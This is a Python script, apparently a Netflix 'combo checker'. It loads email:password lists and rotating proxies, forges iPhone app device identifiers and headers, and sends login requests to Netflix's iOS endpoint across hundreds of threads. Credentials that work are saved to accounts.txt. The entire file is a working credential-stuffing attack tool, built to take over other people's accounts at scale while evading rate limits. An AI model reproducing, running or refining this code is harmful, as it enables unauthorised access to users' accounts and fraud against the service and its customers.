import requests,threading,time,random,json,chardet,pip

def readlines(file,_max=10000000,e=True):
	#limited reading files to 10M line bc the checker was loading all the file in the start 
	#and that's not good if u using big combo and running this in vps with 512mb ram(like me).
	lines = []
	counter = 0
	line = file.readline()
	while line and counter < _max:
		lines.append(line.decode('cp437').replace('\r',''))
		counter += 1
		line = file.readline()
	if line and e:
		print('imported only first ',_max)
	return lines

while True:
	try:
		time.sleep(1)
		cFile = input('combo file: ')
		with open(cFile,'rb+') as file:
			lines = readlines(file)
			lines = [i.split(' ')[0].strip('\n') for i in lines]
			k = 0
			for i in range(len(lines)):
				if lines[i-k] == '\n' or lines[i-k].find(':') == -1 or lines[i-k].find('@') == -1 or lines[i-k].find('.') == -1:
					lines.pop(i-k)
					k += 1
			comboList = lines
			print('Found',len(comboList),'combo.\n')
		break
	except Exception as e:
		print(e)
		pass
print('ProxyTypes:')
proxyTypes = ['http','socks4','socks5']
for i in range(len(proxyTypes)):
	print(i+1,proxyTypes[i])

try:
	inp = input('proxyType(default:http): ')
	if inp in proxyType:
		proxyType = inp
	else:
		proxyType = proxyTypes[int(inp)-1]
except:
	proxyType = 'http'

while True:
	try:
		with open(input('proxy file: '),'rb+') as file:
			lines = readlines(file)
			lines = [i.split(' ')[0].strip('\n')for i in lines]
			k = 0
			for i in range(len(lines)):
				if lines[i-k] == '\n' or lines[i-k].find(':') == -1:
					lines.pop(i-k)
					k += 1
			proxyList = lines
			print('Found',len(proxyList),proxyType,'proxy.\n')
		break
	except Exception as e:
		print(e)

try:
	threads = int(input('Number of threads(default:300): '))
except:
	threads = 300
print('Using',threads,'thread.')

try:
	timeout = int(input('Timeout(default:5): '))
except:
	timeout = 5
print('Timeout',str(timeout)+'sec\n')

output = open("accounts.txt", "w")
gidx = [0 for i in range(threads)]
work = [0 for i in range(threads)]

def resn():
	esn = 'NFAPPL-02-IPHONE8=1-EB0874?h?h?h?h?h?h?h?h?h?h?h?hF1E4?h?h?h?h?h?h?h?h?h?h?h?h0F3034F05DF19404?h?h?h?h?h?h?h?h?h?h?h?h11'
	dicto = '0123456789abcdef'
	while '?h' in esn:
		hpos = esn.find('?h')
		esn = esn[:hpos]+random.choice(dicto)+esn[hpos+2:]
	return esn

def rargo():
	argo = '22?d?d:6|1?d?d9:5'
	dicto = '0123456789'
	while '?d' in argo:
		hpos = argo.find('?d')
		argo = argo[:hpos+1]+random.choice(dicto)+argo[hpos+2:]
	return argo

def threado(comboList,tid):
	c=0
	while gidx[tid] < len(comboList):
		time.sleep(1)
		try:
			proxyy = random.choice(proxyList)
			proxy = {
				'http': proxyType+"://" + proxyy,
				'https': proxyType+"://" +proxyy,
				}
			esn = resn()
			argo = rargo()
			combo = comboList[gidx[tid]].split(':')
			login = json.dumps({"action":"loginAction","fields":{"userLoginId":combo[0],"rememberMe":"true","password":combo[1]},"verb":"POST","mode":"login","flow":"appleSignUp"})
			data = 'appInternalVersion=12.17.0&appVersion=12.17.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22isDPShortPreviewEnabled%22%3Afalse%2C%22isDPAutoPlayIntoTitleEnabled%22%3Afalse%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22interactiveDataGatewayEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22previewsRowEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22isDPaudioSilencedByDefault%22%3Afalse%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22true%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22postplayProductizationEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22videoMerchInDPEnabled%22%3A%22false%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22isAccountProfileLinkEnabled%22%3Afalse%2C%22interactiveFeatureTemplatesPrePlayEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22interactiveFeatureTemplatesEnabled%22%3A%22true%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22roarEnabled%22%3A%22true%22%2C%22topTenListEnabled%22%3A%22false%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22previewsInBillboardEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22isCreatorHomeForRMEnabled%22%3A%22true%22%2C%22kidsParityLolomoDefaultsEnabled%22%3A%22false%22%2C%22titleGroupsRowPatchedEnabled%22%3A%22false%22%2C%22isDPInlineMerchEnabled%22%3Afalse%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22mobileCollectionsTitleGroupsEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22isDPMerchButtonEnabled%22%3Afalse%7D&device_type=NFAPPL-02-&esn='+esn+'&idiom=phone&iosVersion=13.3.1&isTablet=false&kids=false&languages=en-US&locale=en-US&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE8-1&odpAware=true&param='+login+'&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json'
			headers={
				"content-type": "application/x-www-form-urlencoded",
				"X-Netflix.Argo.abTests": argo,
				"X-Netflix.client.appVersion": "12.17.0",
				"X-Netflix.Argo.NFNSM": "9",
				"Connection": "close",
				"Accept-Language": "en-CA;q=1",
				"Accept-Encoding": "gzip, deflate",
				"X-Netflix.esn": esn,
				"X-Netflix.client.idiom": "phone",
				"X-Netflix.Request.Routing": '{"path":"/nq/iosui/argo/~12.17.0/user","control_tag":"iosui_argo"}',
				"User-Agent": "Argo/12.17.0 (iPhone; iOS 13.3.1; Scale/2.00)",
				"X-Netflix.request.client.user.guid": "_fake-guid-for-activate",
				"X-Netflix.client.type": "argo",
				"X-Netflix.Request.Attempt": "1",
				"X-Netflix.client.iosVersion": "13.3.1"
				}
			rep = requests.post('https://ios.prod.ftl.netflix.com/iosui/user/12.17',data=data, headers=headers, proxies=proxy, timeout=timeout)
			rep = rep.content.decode()
			if 'mode":"memberHome' in rep:
				output.write(comboList[gidx[tid]]+'\n')
				work[tid] += 1
				print('found an Account:',comboList[gidx[tid]])
			elif '"mode":"login"' not in rep and 'unrecognized_email_consumption_only' not in rep:
				c+=1
				if c < 10:
					continue
			gidx[tid] += 1
			c=0
		except Exception as e:
			#print(e)
			pass

for i in range(threads):
	threading.Thread(target=threado,args=(comboList[int(len(comboList)/threads*i):int(len(comboList)/threads*(i+1))],i)).start()

time.sleep(10)
while sum(gidx) < len(comboList):
	print('Checked ',sum(gidx),'Found ',sum(work))
	time.sleep(60)

output.close()
input('Done: Found ',sum(work),' Accounts')
